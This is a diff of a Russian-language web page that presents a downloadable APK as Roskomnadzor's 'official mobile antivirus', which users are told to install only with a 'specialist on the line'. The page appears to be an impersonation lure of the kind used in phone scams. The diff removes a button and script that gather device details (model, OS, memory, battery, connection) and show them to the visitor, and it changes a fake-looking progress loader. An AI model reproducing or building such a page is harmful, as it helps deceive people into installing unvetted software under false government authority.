@@ -384,7 +384,6 @@
       <h3>Приложение «Русский стандарт безопасности»</h3>
       <p>Официальный мобильный антивирус Роскомнадзора: сканирует приложения, предупреждает о фишинге, блокирует мошеннические сайты и контролирует передачу данных. Устанавливается только со специалистом на линии!</p>
       <a href="RusStandSafety.apk" download class="download-btn">Скачать приложение</a>
-      <button id="checkPhone" class="download-btn" style="margin-left:16px;">Проверить свой телефон</button>
     </section>
 
     <hr class="divider">
@@ -443,34 +442,6 @@
     </div>
   </div>
 
-  <!-- Модалка: информация об устройстве -->
-<!-- Модалка: информация об устройстве -->
-<div id="phoneModal" class="modal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h2>Информация об устройстве</h2>
-      <button class="modal-close" onclick="closePhoneModal()">×</button>
-    </div>
-    <div class="modal-body">
-      <p><strong>User-Agent:</strong> <span id="pi-userAgent"></span></p>
-      <p><strong>OS:</strong> <span id="pi-osName"></span> <span id="pi-osVersion"></span></p>
-      <p><strong>Бренд/модель:</strong> <span id="pi-deviceBrand"></span> / <span id="pi-deviceModel"></span></p>
-      <p><strong>Платформа:</strong> <span id="pi-platform"></span></p>
-      <p><strong>Вендор:</strong> <span id="pi-vendor"></span></p>
-      <p><strong>Язык:</strong> <span id="pi-language"></span></p>
-      <p><strong>Доступные языки:</strong> <span id="pi-languages"></span></p>
-      <p><strong>Память (GB):</strong> <span id="pi-memory"></span></p>
-      <p><strong>Ядер CPU:</strong> <span id="pi-cpu"></span></p>
-      <p><strong>Макс. касаний:</strong> <span id="pi-touch"></span></p>
-      <p><strong>Коэффициент пикселей:</strong> <span id="pi-pixelRatio"></span></p>
-      <p><strong>Экран (px):</strong> <span id="pi-screen"></span></p>
-      <p><strong>Окно просмотра (px):</strong> <span id="pi-viewport"></span></p>
-      <p><strong>Сеть:</strong> <span id="pi-connection"></span></p>
-      <p><strong>Батарея:</strong> <span id="pi-battery"></span></p>
-    </div>
-  </div>
-</div>
-
   <!-- Анкета безопасности -->
   <div id="security-survey" class="modal survey-hidden" role="dialog" aria-modal="true" aria-labelledby="surveyTitle">
     <div class="modal-content">
@@ -516,21 +487,27 @@
 
   // Функция хаотичного заполнения полосы
   function animateBar() {
-    if (percent < 100) {
-      // приращение 2–12%
-      const delta = 1 + Math.random() * 10;
-      percent = Math.min(percent + delta, 100);
-      barEl.style.width = percent + '%';
-      barEl.parentNode.setAttribute('aria-valuenow', Math.round(percent));
-      // следующий шаг через 100–300 мс
-      setTimeout(animateBar, 200 + Math.random() * 200);
-    } else {
-      // когда дошли до 100%, плавно скрываем лоадер
+  if (percent < 100) {
+    const delta = 1 + Math.random() * 10;
+    percent = Math.min(percent + delta, 100);
+    barEl.style.width = percent + '%';
+    barEl.parentNode.setAttribute('aria-valuenow', Math.round(percent));
+    setTimeout(animateBar, 200 + Math.random() * 200);
+  } else {
+    // 1) Показываем галочку и слово "Завершено"
+    document.querySelector('#loader .spinner').style.display = 'none';
+    statusEl.innerHTML = '<span style="color:#4caf50; font-size:24px; vertical-align:middle;">✓</span> Завершено';
+    barEl.style.background = '#4caf50';
+    barEl.style.width = '100%';
+
+    // 2) Ждём 1 секунду, затем плавно скрываем лоадер
+    setTimeout(() => {
       loader.style.transition = 'opacity .5s';
       loader.style.opacity = '0';
       setTimeout(() => loader.style.display = 'none', 500);
-    }
+    }, 1000);
   }
+}
 
   // Стартуем одновременно
   nextStatus();
@@ -629,102 +606,6 @@ function filterEmployees() {
     card.style.display = employees[i].name.toLowerCase().includes(term) ? '' : 'none';
   });
 }
-
-    // 1) Сбор информации без геолокации
-async function getPhoneInfo() {
-  const nav = navigator;
-  const ua  = nav.userAgent;
-  const info = {
-    userAgent: ua,
-    platform: nav.platform,
-    vendor: nav.vendor,
-    language: nav.language,
-    languages: nav.languages.join(', '),
-    deviceMemory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'не поддерживается',
-    cpuCores: nav.hardwareConcurrency || 'не поддерживается',
-    maxTouchPoints: nav.maxTouchPoints || 0,
-    pixelRatio: window.devicePixelRatio,
-    screen: `${screen.width}×${screen.height}`,
-    viewport: `${window.innerWidth}×${window.innerHeight}`,
-    connection: nav.connection
-      ? `${nav.connection.effectiveType}, downlink ${nav.connection.downlink}Mb/s, RTT ${nav.connection.rtt}ms`
-      : 'не поддерживается',
-    battery: 'запрос…',
-    osName: 'неизвестно',
-    osVersion: 'неизвестно',
-    deviceBrand: 'неизвестно',
-    deviceModel: 'неизвестно'
-  };
-
-  // Пытаемся вытащить из userAgent Android-модель
-  const androidMatch = ua.match(/Android\s+([\d.]+);?\s*(.+?)\s*Build\//i);
-  if (androidMatch) {
-    info.osName     = 'Android';
-    info.osVersion  = androidMatch[1];
-    info.deviceModel = androidMatch[2].trim();
-    info.deviceBrand = info.deviceModel.split(' ')[0];
-  }
-
-  // Или iOS
-  const iosMatch = ua.match(/\((iPhone|iPad);\s+CPU\s+OS\s*([\d_]+)\s+like/i);
-  if (iosMatch) {
-    info.osName     = iosMatch[1];
-    info.osVersion  = iosMatch[2].replace(/_/g, '.');
-    info.deviceBrand = 'Apple';
-    info.deviceModel = iosMatch[1];
-  }
-
-  // Battery API
-  if (nav.getBattery) {
-    try {
-      const bat = await nav.getBattery();
-      info.battery = `${(bat.level * 100).toFixed(0)}%` +
-                     (bat.charging ? ' (зарядка)' : '');
-    } catch {
-      info.battery = 'ошибка получения';
-    }
-  }
-
-  return info;
-}
-
-// 2) Открыть и заполнить модалку
-async function openPhoneModal() {
-  const modal = document.getElementById('phoneModal');
-  document.body.classList.add('modal-open');
-  modal.classList.add('open');
-
-  const info = await getPhoneInfo();
-  document.getElementById('pi-osName').textContent     = info.osName;
-document.getElementById('pi-osVersion').textContent  = info.osVersion;
-document.getElementById('pi-deviceBrand').textContent = info.deviceBrand;
-document.getElementById('pi-deviceModel').textContent = info.deviceModel;
-  document.getElementById('pi-userAgent').textContent = info.userAgent;
-  document.getElementById('pi-platform').textContent  = info.platform;
-  document.getElementById('pi-vendor').textContent    = info.vendor;
-  document.getElementById('pi-language').textContent  = info.language;
-  document.getElementById('pi-languages').textContent = info.languages;
-  document.getElementById('pi-memory').textContent    = info.deviceMemory;
-  document.getElementById('pi-cpu').textContent       = info.cpuCores;
-  document.getElementById('pi-touch').textContent     = info.maxTouchPoints;
-  document.getElementById('pi-pixelRatio').textContent = info.pixelRatio;
-  document.getElementById('pi-screen').textContent    = info.screen;
-  document.getElementById('pi-viewport').textContent  = info.viewport;
-  document.getElementById('pi-connection').textContent = info.connection;
-  document.getElementById('pi-battery').textContent   = info.battery;
-}
-
-// 3) Закрытие модалки
-function closePhoneModal() {
-  const modal = document.getElementById('phoneModal');
-  document.body.classList.remove('modal-open');
-  modal.classList.remove('open');
-}
-
-// 4) Привязка кнопки
-document.getElementById('checkPhone')
-  .addEventListener('click', openPhoneModal);
-    
 </script>
 </body>
 </html>
